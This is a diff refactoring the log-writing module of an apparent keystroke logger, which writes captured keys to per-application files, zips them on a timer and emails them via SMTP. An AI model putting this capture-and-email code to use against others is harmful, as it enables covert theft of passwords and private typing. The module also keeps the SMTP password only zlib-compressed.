@@ -22,13 +22,14 @@ from email import Encoders
 class LogWriter:
     '''Manages the writing of log files and logfile maintenance activities.
     '''
-    def __init__(self, settings):
+    def __init__(self, settings, cmdoptions):
         
         self.settings = settings
-        self.settings['dirname'] = os.path.normpath(self.settings['dirname'])
+        self.cmdoptions = cmdoptions
+        #self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
         
         try:
-            os.makedirs(self.settings['dirname'], 0777) 
+            os.makedirs(self.settings['General']['Log Directory'], 0777) 
         except OSError, detail:
             if(detail.errno==17):  #if directory already exists, swallow the error
                 pass
@@ -40,9 +41,9 @@ class LogWriter:
         self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")      #regexp filter for the non-allowed characters in windows filenames.
         
         self.writeTarget = ""
-        if self.settings['systemlog'] != 'None':
+        if self.settings['General']['System Log'] != 'None':
             try:
-                self.systemlog = open(os.path.join(self.settings['dirname'], self.settings['systemlog']), 'a')
+                self.systemlog = open(os.path.join(self.settings['General']['Log Directory'], self.settings['General']['System Log']), 'a')
             except OSError, detail:
                 if(detail.errno==17):  #if file already exists, swallow the error
                     pass
@@ -58,34 +59,36 @@ class LogWriter:
         self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
         self.asciiSubset.extend(range(32,255))      #all normal printable chars
         
-        if self.settings['parsebackspace'] == 'True':
+        if self.settings['General']['Parse Backspace'] == True:
             self.asciiSubset.remove(8)              #remove backspace from allowed chars if needed
-        if self.settings['parseescape'] == 'True':
+        if self.settings['General']['Parse Escape'] == True:
             self.asciiSubset.remove(27)             #remove escape from allowed chars if needed
 
+        # todo: no need for float() typecasting, since that is now taken care by config validation
+
         # initialize the automatic zip and email timer, if enabled in .ini
-        if self.settings['smtpsendemail'] == 'True':
-            self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60*60, 0, self.SendZipByEmail)
+        if self.settings['E-mail']['SMTP Send Email'] == True:
+            self.emailtimer = mytimer.MyTimer(float(self.settings['E-mail']['Email Interval'])*60*60, 0, self.SendZipByEmail)
             self.emailtimer.start()
         
         # initialize automatic old log deletion timer
-        if self.settings['deleteoldlogs'] == 'True':
-            self.oldlogtimer = mytimer.MyTimer(float(self.settings['agecheckinterval'])*60*60, 0, self.DeleteOldLogs)
+        if self.settings['Log Maintenance']['Delete Old Logs'] == True:
+            self.oldlogtimer = mytimer.MyTimer(float(self.settings['Log Maintenance']['Age Check Interval'])*60*60, 0, self.DeleteOldLogs)
             self.oldlogtimer.start()
         
         # initialize the automatic timestamp timer
-        if self.settings['timestampenable'] == 'True':
-            self.timestamptimer = mytimer.MyTimer(float(self.settings['timestampinterval'])*60, 0, self.WriteTimestamp)
+        if self.settings['Timestamp']['Timestamp Enable'] == True:
+            self.timestamptimer = mytimer.MyTimer(float(self.settings['Timestamp']['Timestamp Interval'])*60, 0, self.WriteTimestamp)
             self.timestamptimer.start()
         
         # initialize the automatic log flushing timer
-        self.flushtimer = mytimer.MyTimer(float(self.settings['flushinterval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer\n"])
+        self.flushtimer = mytimer.MyTimer(float(self.settings['General']['Flush Interval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer\n"])
         self.flushtimer.start()
         
         # initialize some automatic zip stuff
-        self.settings['ziparchivename'] = "log_[date].zip"
-        if self.settings['zipenable'] == 'True':
-            self.ziptimer = mytimer.MyTimer(float(self.settings['zipinterval'])*60*60, 0, self.ZipLogFiles)
+        #self.settings['Zip']['ziparchivename'] = "log_[date].zip"
+        if self.settings['Zip']['Zip Enable'] == True:
+            self.ziptimer = mytimer.MyTimer(float(self.settings['Zip']['Zip Interval'])*60*60, 0, self.ZipLogFiles)
             self.ziptimer.start()
 
 
@@ -95,10 +98,10 @@ class LogWriter:
         loggable = self.TestForNoLog(event)     # see if the program is in the no-log list.
                 
         if not loggable:
-            if self.settings['debug']: self.PrintDebug("not loggable, we are outta here\n")
+            if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
             return
         
-        if self.settings['debug']: self.PrintDebug("loggable, lets log it\n")
+        if self.cmdoptions.debug: self.PrintDebug("loggable, lets log it\n")
         
         loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
         
@@ -108,7 +111,7 @@ class LogWriter:
 
         if event.Ascii in self.asciiSubset:
             self.PrintStuff(chr(event.Ascii))
-        if event.Ascii == 13 and self.settings['addlinefeed'] == 'True':
+        if event.Ascii == 13 and self.settings['General']['Add Line Feed'] == True:
             self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
             
         #we translate all the special keys, such as arrows, backspace, into text strings for logging
@@ -117,11 +120,11 @@ class LogWriter:
             self.PrintStuff('[KeyName:' + event.Key + ']')
         
         #translate backspace into text string, if option is set.
-        if event.Ascii == 8 and self.settings['parsebackspace'] == 'True':
+        if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
             self.PrintStuff('[KeyName:' + event.Key + ']')
         
         #translate escape into text string, if option is set.
-        if event.Ascii == 27 and self.settings['parseescape'] == True:
+        if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
             self.PrintStuff('[KeyName:' + event.Key + ']')
 
         # this has now been disabled, since flushing is done both automatically at interval,
@@ -134,8 +137,8 @@ class LogWriter:
         is listed in the noLog option, and True otherwise.'''
         
         self.processName = self.GetProcessNameFromHwnd(event.Window)
-        if self.settings['nolog'] != 'None':
-            for path in self.settings['nolog'].split(';'):
+        if self.settings['General']['Applications Not Logged'] != 'None':
+            for path in self.settings['General']['Applications Not Logged'].split(';'):
                 if os.stat(path) == os.stat(self.processName):    #we use os.stat instead of comparing strings due to multiple possible representations of a path
                     return False
         return True
@@ -145,7 +148,7 @@ class LogWriter:
         '''
         self.PrintDebug(logstring)
         if self.log != None: self.log.flush()
-        if self.settings['systemlog'] != 'None': self.systemlog.flush()
+        if self.settings['General']['System Log'] != 'None': self.systemlog.flush()
 
     def ZipLogFiles(self):
         '''Create a zip archive of all files in the log directory.
@@ -154,10 +157,12 @@ class LogWriter:
         '''
         self.FlushLogWriteBuffers("Flushing write buffers prior to zipping the logs\n")
         
+        zipFilePattern = "log_[date].zip"
         zipFileTime = time.strftime("%Y%m%d_%H%M%S")
-        zipFileName = re.sub(r"\[date\]", zipFileTime, self.settings['ziparchivename'])
+        zipFileRawTime = time.time()
+        zipFileName = re.sub(r"\[date\]", zipFileTime, zipFilePattern)
 
-        os.chdir(self.settings['dirname'])
+        os.chdir(self.settings['General']['Log Directory'])
         myzip = zipfile.ZipFile(zipFileName, "w", zipfile.ZIP_DEFLATED)
         
         for root, dirs, files in os.walk(os.curdir):
@@ -175,9 +180,12 @@ class LogWriter:
         # write the name of the last completed zip file
         # so that we can check against this when emailing or ftping, to make sure
         # we do not try to transfer a zipfile which is in the process of being created
-        ziplog=open(os.path.join(self.settings['dirname'], "ziplog.txt"), 'w')
+        ziplog=open(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt"), 'w')
         ziplog.write(zipFileName)
         ziplog.close()
+        
+        #now we can delete all the logs that have not been modified since we made the zip. 
+        self.DeleteOldLogs(zipFileRawTime)
     
     def CheckIfZipFile(self, filename):
         '''Helper function for ZipLogFiles to make sure we don't include
@@ -207,83 +215,102 @@ class LogWriter:
         
         #~ write new lastemailed to emaillog.txt
         
-        self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
+        self.PrintDebug("Sending mail to " + self.settings['E-mail']['SMTP To'] + "\n")
         
-        if self.settings['zipenable'] == 'False':
+        if self.settings['Zip']['Zip Enable'] == False or os.path.isfile(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt")) == False:
             self.ZipLogFiles()
         
         try:
-            ziplog = open(os.path.join(self.settings['dirname'], "ziplog.txt"), 'r')
+            ziplog = open(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt"), 'r')
             latestZipFile = ziplog.readline()
             ziplog.close()
+            if not self.CheckIfZipFile(latestZipFile):
+                self.PrintDebug("latest zip filename does not match proper filename pattern. something went wrong. stopping.\n")
+                return
         except:
             self.PrintDebug("Unexpected error opening ziplog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
             return
         
-        if not self.CheckIfZipFile(latestZipFile):
-            self.PrintDebug("latest zip filename does not match proper filename pattern. something went wrong. stopping.\n")
-            return
+        #~ if not self.CheckIfZipFile(latestZipFile):
+            #~ self.PrintDebug("latest zip filename does not match proper filename pattern. something went wrong. stopping.\n")
+            #~ return
         
         try:
-            emaillog = open(os.path.join(self.settings['dirname'], "emaillog.txt"), 'r')
+            latestZipEmailed = "" #initialize to blank, just in case emaillog.txt doesn't get read
+            emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'r')
             latestZipEmailed = emaillog.readline()
             emaillog.close()
+            if not self.CheckIfZipFile(latestZipEmailed):
+                self.PrintDebug("latest emailed zip filename does not match proper filename pattern. something went wrong. stopping.\n")
+                return
         except:
             self.PrintDebug("Error opening emaillog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\nWill email all available log zips.\n")
         
-        if not self.CheckIfZipFile(latestZipEmailed):
-            self.PrintDebug("latest emailed zip filename does not match proper filename pattern. something went wrong. stopping.\n")
-            return
+        #~ if not self.CheckIfZipFile(latestZipEmailed):
+            #~ self.PrintDebug("latest emailed zip filename does not match proper filename pattern. something went wrong. stopping.\n")
+            #~ return
         
-        zipFileList = os.listdir(self.settings['dirname'])
-        for filename in zipFileList:
-            if not self.CheckIfZipFile(filename):
-                zipFileList.remove(filename)
-            # we can do the following string comparison due to the structured and dated format of the filenames
-            elif filename <= latestZipEmailed or filename > latestZipFile:
-                zipFileList.remove(filename)
-                
+        zipFileList = os.listdir(self.settings['General']['Log Directory'])
+        self.PrintDebug(str(zipFileList))
+        if len(zipFileList) > 0:
+            # removing elements from a list while iterating over it produces undesirable results
+            # so we do the os.listdir again to iterate over
+            for filename in os.listdir(self.settings['General']['Log Directory']):
+                if not self.CheckIfZipFile(filename):
+                    zipFileList.remove(filename)
+                    self.PrintDebug("removing " + filename + " from zipfilelist because it's not a zipfile\n")
+                # we can do the following string comparison due to the structured and dated format of the filenames
+                elif filename <= latestZipEmailed or filename > latestZipFile:
+                    zipFileList.remove(filename)
+                    self.PrintDebug("removing " + filename + " from zipfilelist because it's not in range\n")
+        
+        self.PrintDebug(str(zipFileList))
         
         # set up the message
         msg = MIMEMultipart()
-        msg['From'] = self.settings['smtpfrom']
-        msg['To'] = COMMASPACE.join(self.settings['smtpto'].split(";"))
+        msg['From'] = self.settings['E-mail']['SMTP From']
+        msg['To'] = COMMASPACE.join(self.settings['E-mail']['SMTP To'].split(";"))
         msg['Date'] = formatdate(localtime=True)
-        msg['Subject'] = self.settings['smtpsubject']
+        msg['Subject'] = self.settings['E-mail']['SMTP Subject']
 
-        msg.attach( MIMEText(self.settings['smtpmessagebody']) )
+        msg.attach( MIMEText(self.settings['E-mail']['SMTP Message Body']) )
 
-        for file in zipFileList:
-            part = MIMEBase('application', "octet-stream")
-            part.set_payload( open(os.path.join(self.settings['dirname'], file),"rb").read() )
-            Encoders.encode_base64(part)
-            part.add_header('Content-Disposition', 'attachment; filename="%s"'
-                           % os.path.basename(file))
-            msg.attach(part)
+        if len(zipFileList) == 0:
+            msg.attach( MIMEText("No new logs present.") )
+
+        if len(zipFileList) > 0:
+            for file in zipFileList:
+                part = MIMEBase('application', "octet-stream")
+                part.set_payload( open(os.path.join(self.settings['General']['Log Directory'], file),"rb").read() )
+                Encoders.encode_base64(part)
+                part.add_header('Content-Disposition', 'attachment; filename="%s"'
+                               % os.path.basename(file))
+                msg.attach(part)
 
         # set up the server and send the message
-        mysmtp = smtplib.SMTP(self.settings['smtpserver'])
+        mysmtp = smtplib.SMTP(self.settings['E-mail']['SMTP Server'])
         
-        if self.settings['debug']: 
+        if self.cmdoptions.debug: 
             mysmtp.set_debuglevel(1)
-        if self.settings['smtpneedslogin'] == 'True':
-            mysmtp.login(self.settings['smtpusername'],self.settings['smtppassword'])
-        sendingresults=mysmtp.sendmail(self.settings['smtpfrom'], self.settings['smtpto'].split(";"), msg.as_string())
+        if self.settings['E-mail']['SMTP Needs Login'] == True:
+            mysmtp.login(self.settings['E-mail']['SMTP Username'],zlib.decompress(self.settings['E-mail']['SMTP Password']))
+        sendingresults = mysmtp.sendmail(self.settings['E-mail']['SMTP From'], self.settings['E-mail']['SMTP To'].split(";"), msg.as_string())
         self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
         mysmtp.quit()
         
         # write the latest emailed zip to log for the future
-        zipFileList.sort()
-        emaillog = open(os.path.join(self.settings['dirname'], "emaillog.txt"), 'w')
-        emaillog.write(zipFileList.pop())
-        emaillog.close()
+        if len(zipFileList) > 0:
+            zipFileList.sort()
+            emaillog = open(os.path.join(self.settings['General']['Log Directory'], "emaillog.txt"), 'w')
+            emaillog.write(zipFileList.pop())
+            emaillog.close()
 
     def ZipAndEmailTimerAction(self):
         '''This is a timer action function that zips the logs and sends them by email.
         
         deprecated - should delete this.
         '''
-        self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
+        self.PrintDebug("Sending mail to " + self.settings['E-mail']['SMTP To'] + "\n")
         self.ZipLogFiles()
         self.SendZipByEmail()
     
@@ -291,9 +318,9 @@ class LogWriter:
         '''Open the appropriate log file, depending on event properties and settings in .ini file.
         '''
         # if the "onefile" option is set, we don't that much to do:
-        if self.settings['onefile'] != 'None':
+        if self.settings['General']['One File'] != 'None':
             if self.writeTarget == "":
-                self.writeTarget = os.path.join(os.path.normpath(self.settings['dirname']), os.path.normpath(self.settings['onefile']))
+                self.writeTarget = os.path.join(os.path.normpath(self.settings['General']['Log Directory']), os.path.normpath(self.settings['General']['One File']))
                 try:
                     self.log = open(self.writeTarget, 'a')
                 except OSError, detail:
@@ -307,7 +334,7 @@ class LogWriter:
                     return False
                 
                 #write the timestamp upon opening the logfile
-                if self.settings['timestampenable'] == 'True': self.WriteTimestamp()
+                if self.settings['Timestamp']['Timestamp Enable'] == True: self.WriteTimestamp()
 
                 self.PrintDebug("writing to: " + self.writeTarget + "\n")
             return True
@@ -321,28 +348,28 @@ class LogWriter:
         
         #make sure our filename plus path is not longer than 255 characters, as per filesystem limit.
         #filename = filename[0:200] + ".txt"     
-        if len(os.path.join(self.settings['dirname'], subDirName, filename)) > 255:
-            if len(os.path.join(self.settings['dirname'], subDirName)) > 250:
+        if len(os.path.join(self.settings['General']['Log Directory'], subDirName, filename)) > 255:
+            if len(os.path.join(self.settings['General']['Log Directory'], subDirName)) > 250:
                 self.PrintDebug("root log dir + subdirname is longer than 250. cannot log.")
                 return False
             else:
-                filename = filename[0:255-len(os.path.join(self.settings['dirname'], subDirName))-4] + ".txt"  
+                filename = filename[0:255-len(os.path.join(self.settings['General']['Log Directory'], subDirName))-4] + ".txt"  
         
 
         #we have this writetarget conditional to make sure we dont keep opening and closing the log file when all inputs are going
         #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
         #already-opened file.
-        if self.writeTarget != os.path.join(self.settings['dirname'], subDirName, filename): 
+        if self.writeTarget != os.path.join(self.settings['General']['Log Directory'], subDirName, filename): 
             if self.writeTarget != "":
                 self.FlushLogWriteBuffers("flushing and closing old log\n")
                 #~ self.PrintDebug("flushing and closing old log\n")
                 #~ self.log.flush()
                 self.log.close()
-            self.writeTarget = os.path.join(self.settings['dirname'], subDirName, filename)
+            self.writeTarget = os.path.join(self.settings['General']['Log Directory'], subDirName, filename)
             self.PrintDebug("writeTarget:" + self.writeTarget + "\n")
             
             try:
-                os.makedirs(os.path.join(self.settings['dirname'], subDirName), 0777)
+                os.makedirs(os.path.join(self.settings['General']['Log Directory'], subDirName), 0777)
             except OSError, detail:
                 if(detail.errno==17):  #if directory already exists, swallow the error
                     pass
@@ -366,36 +393,54 @@ class LogWriter:
                 return False
             
             #write the timestamp upon opening a new logfile
-            if self.settings['timestampenable'] == 'True': self.WriteTimestamp()
+            if self.settings['Timestamp']['Timestamp Enable'] == True: self.WriteTimestamp()
         
         return True
 
     def PrintStuff(self, stuff):
         '''Write stuff to log, or to debug outputs.
         '''
-        if not self.settings['debug'] and self.log != None:
+        if not self.cmdoptions.debug and self.log != None:
             self.log.write(stuff)
-        if self.settings['debug']:
+        if self.cmdoptions.debug:
             self.PrintDebug(stuff)
 
     def PrintDebug(self, stuff):
         '''Write stuff to console and/or systemlog.
         '''
-        if self.settings['debug']:
+        if self.cmdoptions.debug:
             sys.stdout.write(stuff)
-        if self.settings['systemlog'] != 'None':
+        if self.settings['General']['System Log'] != 'None':
             self.systemlog.write(stuff)
 
     def WriteTimestamp(self):
         self.PrintStuff("\n[" + time.asctime() + "]\n")
 
-    def DeleteOldLogs(self):
-        '''Walk the log directory tree and remove any logfiles older than maxlogage (as set in .ini).
+    def DeleteOldLogs(self, lastmodcutoff=None):
+        '''Walk the log directory tree and remove old logfiles.
+
+        if lastmodcutoff is not supplied, delete files older than maxlogage, as specified in .ini file.
+        
+        if lastmodcutoff is supplied [in seconds since epoch, as supplied by time.time()],
+        instead delete files that were not modified after lastmodcutoff.
         '''
+        
+        
         self.PrintDebug("Analyzing and removing old logfiles.\n")
-        for root, dirs, files in os.walk(self.settings['dirname']):
+        for root, dirs, files in os.walk(self.settings['General']['Log Directory']):
             for fname in files:
-                if time.time() - os.path.getmtime(os.path.join(root,fname)) > float(self.settings['maxlogage'])*24*60*60:
+                if lastmodcutoff == None:
+                    testvalue = time.time() - os.path.getmtime(os.path.join(root,fname)) > float(self.settings['Log Maintenance']['Max Log Age'])*24*60*60
+                elif type(lastmodcutoff) == float:
+                    testvalue = os.path.getmtime(os.path.join(root,fname)) < lastmodcutoff
+                
+                if fname == "emaillog.txt" or fname == "ziplog.txt":
+                    testvalue = False # we don't want to delete these
+                
+                if type(lastmodcutoff) == float and self.CheckIfZipFile(fname):
+                    testvalue = False # we don't want to delete zipped logs, unless running on timer and using maxlogage
+                
+                if testvalue:
                     try:
                         os.remove(os.path.join(root,fname))
                     except:
@@ -421,13 +466,13 @@ class LogWriter:
         '''
         self.FlushLogWriteBuffers("Flushing buffers prior to exiting")
         self.flushtimer.cancel()
-        if self.settings['smtpsendemail'] == 'True':
+        if self.settings['E-mail']['SMTP Send Email'] == True:
             self.emailtimer.cancel()
-        if self.settings['deleteoldlogs'] == 'True':
+        if self.settings['Log Maintenance']['Delete Old Logs'] == True:
             self.oldlogtimer.cancel()
-        if self.settings['timestampenable'] == 'True':
+        if self.settings['Timestamp']['Timestamp Enable'] == True:
             self.timestamptimer.cancel()
-        if self.settings['zipenable'] == 'True':
+        if self.settings['Zip']['Zip Enable'] == True:
             self.ziptimer.cancel()
 
 if __name__ == '__main__':
